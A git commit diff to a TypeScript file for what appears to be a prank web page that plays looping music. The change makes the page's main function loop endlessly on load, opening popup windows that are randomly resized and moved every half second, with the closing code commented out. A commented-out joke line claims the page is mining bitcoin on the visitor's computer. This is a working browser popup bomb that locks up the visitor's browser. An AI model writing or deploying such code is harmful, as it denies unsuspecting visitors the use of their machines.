12a6f581a18ccd83c17002a70e6787006774ca1e
whoyoux <48690153+whoyoux@users.noreply.github.com>
2023-08-26 19:21:48 +0200

    Update main.ts

--- src/main.ts
+++ src/main.ts
@@ -1,8 +1,11 @@
 const music = new Audio('muza.mp3');
 
 const main = () => {
-    console.log('szkajpurPompa')
-    console.log('jak cos to kopie wlasnie bitcoina na twoim kompie iksde')
+    //console.log('szkajpurPompa')
+    //console.log('jak cos to kopie wlasnie bitcoina na twoim kompie iksde')
+    while (true) {
+        new NewWindow();
+    }
 }
 
 addEventListener('DOMContentLoaded', () => {
@@ -13,5 +16,29 @@ addEventListener('click', () => {
     music.loop = true;
     music.play();
 });
+
+class NewWindow {
+    constructor() {
+        const win = window.open('', '_blank', "location=yes,height=150,width=150,scrollbars=yes,status=yes");
+        if (!win) return;
+
+        win.document.write('<html><body>dupsko</body></html>')
+        // win.onload = function (ev) {
+
+
+        // }
+        let timmy = setInterval(() => {
+            let w = Math.random() * parseInt(window.screen.availWidth.toString());
+            let h = Math.random() * parseInt(window.screen.availHeight.toString());
+            win.resizeTo(w, h);
+            win.moveTo(w, h)
+        }, 500);
+
+        // setTimeout(() => {
+        //     clearInterval(timmy);
+        //     win.close();
+        // }, 6000);
+    }
+}
 
 export { }
